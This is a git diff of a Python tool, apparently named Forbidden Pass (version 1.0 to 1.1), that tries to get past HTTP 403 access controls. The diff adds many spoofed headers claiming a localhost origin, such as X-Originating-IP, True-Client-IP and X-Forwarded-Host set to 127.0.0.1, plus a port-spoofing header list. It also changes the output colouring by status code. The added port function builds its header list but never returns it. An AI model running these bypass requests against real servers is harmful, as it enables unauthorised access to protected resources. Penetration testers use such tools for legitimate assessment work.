@@ -14,7 +14,7 @@ ___________         ___.   .__    .___  .___           __________
  |    __)/  _ \_  __ \ __ \|  |/ __ |/ __ |/ __ \ /    \|     ___/\__  \  /  ___//  ___/
  |     \(  <_> )  | \/ \_\ \  / /_/ / /_/ \  ___/|   |  \    |     / __ \_\___ \ \___ \
  \___  / \____/|__|  |___  /__\____ \____ |\___  >___|  /____|    (____  /____  >____  >
-     \/                  \/        \/    \/    \/     \/               \/     \/     \/   v1.0
+     \/                  \/        \/    \/    \/     \/               \/     \/     \/   v1.1
 by c0d3Ninja, MrPMillz
 
 """
@@ -60,10 +60,32 @@ def header_bypass(path=None):
         {'User-Agent': str(ua.chrome), 'X-Custom-IP-Authorization': '127.0.0.1'},
         {'User-Agent': str(ua.chrome), 'X-Forwarded-For': 'http://127.0.0.1'},
         {'User-Agent': str(ua.chrome), 'X-Forwarded-For': '127.0.0.1:80'},
+        {'User-Agent': str(ua.chrome), 'X-Originally-Forwarded-For': '127.0.0.1'},
+        {'User-Agent': str(ua.chrome), 'X-Originating-': 'http://127.0.0.1'},
+        {'User-Agent': str(ua.chrome), 'X-Originating-IP': '127.0.0.1'},
+        {'User-Agent': str(ua.chrome), 'True-Client-IP': '127.0.0.1'},
+        {'User-Agent': str(ua.chrome), 'X-WAP-Profile': '127.0.0.1'},
+        {'User-Agent': str(ua.chrome), 'X-Arbitrary': 'http://127.0.0.1'},
+        {'User-Agent': str(ua.chrome), 'X-HTTP-DestinationURL': 'http://127.0.0.1'},
+        {'User-Agent': str(ua.chrome), 'X-Forwarded-Proto': 'http://127.0.0.1'},
+        {'User-Agent': str(ua.chrome), 'Destination': '127.0.0.1'},
+        {'User-Agent': str(ua.chrome), 'X-Remote-IP': '127.0.0.1'},
+        {'User-Agent': str(ua.chrome), 'X-Client-IP': 'http://127.0.0.1'},
+        {'User-Agent': str(ua.chrome), 'X-Host': 'http://127.0.0.1'},
+        {'User-Agent': str(ua.chrome), 'X-Forwarded-Host': 'http://127.0.0.1'},
+        {'User-Agent': str(ua.chrome), 'X-ProxyUser-Ip': '127.0.0.1'},
         {'User-Agent': str(ua.chrome), 'X-rewrite-url': path if path else '/'}
     ]
     return headers
 
+def port_based_bypass(path=None):
+    headers = [
+        {'User-Agent': str(ua.chrome)},
+        {'User-Agent': str(ua.chrome), 'X-Forwarded-Port': '4443'},
+        {'User-Agent': str(ua.chrome), 'X-Forwarded-Port': '80'},
+        {'User-Agent': str(ua.chrome), 'X-Forwarded-Port': '8080'},
+        {'User-Agent': str(ua.chrome), 'X-Forwarded-Port': '8443'}
+    ]
 
 def do_request(url: str, stream=False, path=None):
     if path:
@@ -76,9 +98,11 @@ def do_request(url: str, stream=False, path=None):
                 r = requests.get(url, stream=True, headers=header)
             else:
                 r = requests.get(url, headers=header)
-            print(Fore.WHITE + url + ' ' + json.dumps(list(header.items())[-1]) + Fore.GREEN + " [{}]".format(r.status_code))
+            if r.status_code == 200:
+                print(Fore.WHITE + url + ' ' + json.dumps(list(header.items())[-1]) + Fore.GREEN + " [{}]".format(r.status_code))
+            else:
+                print(Fore.WHITE + url + ' ' + json.dumps(list(header.items())[-1]) + Fore.RED + " [{}]".format(r.status_code))
     except requests.exceptions.ConnectionError as ce_error:
-        print("Connection Error: ", ce_error)
         pass
     except requests.exceptions.Timeout as t_error:
         print("Connection Timeout Error: ", t_error)
